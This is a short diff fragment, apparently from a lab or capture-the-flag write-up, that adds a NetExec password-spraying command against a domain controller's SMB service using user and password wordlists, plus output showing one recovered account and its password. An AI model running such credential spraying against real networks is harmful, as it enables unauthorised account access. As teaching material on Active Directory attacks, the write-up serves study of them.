@@ -889,5 +889,10 @@ This is the full password wordlist
 Its also worth noting there isnt a password policy
 
 ```python
+nxc smb dc01.ctos.corp -u users.txt -p passwords.txt --continue-on-success
+
+...[SNIP]...
+
+SMB         10.1.24.233     445    DC01             [+] CTOS.CORP\l_conrad:LIS!2026$ad 
 
 ```
